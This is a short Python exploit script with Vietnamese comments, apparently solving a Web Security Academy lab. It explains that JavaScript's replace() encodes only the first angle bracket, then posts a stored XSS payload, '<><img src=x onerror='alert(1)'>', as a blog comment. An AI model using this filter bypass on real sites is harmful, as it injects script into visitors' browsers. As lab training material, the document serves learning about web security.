# web xử lý logic lỗi, cụ thể là : 
# Trong JavaScript, hàm String.prototype.replace('ký_tự_tìm', 'ký_tự_thay') chỉ thay thế duy nhất ký tự ĐẦU TIÊN mà nó tìm thấy trong chuỗi. Tất cả các ký tự giống như vậy ở phía sau sẽ bị bỏ qua!
# do đó , chỉ việc thêm <> vào trước payload thì mọi công sức mã hóa coi như vô dụng
# payload: <><img src=x onerror='alert(1)'>

import requests

burp0_url = "https://YOUR_HOST.web-security-academy.net:443/post/comment"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br", 
    "Content-Type": "application/x-www-form-urlencoded", 
    "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", 
    "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", 
    "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers"
}
burp0_data = {"csrf": "CSRF", "postId": "10", "comment": "<><img src=x onerror='alert(1)'>", "name": "test", "email": "test@gmail.com", "website": "http://google.com"}
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)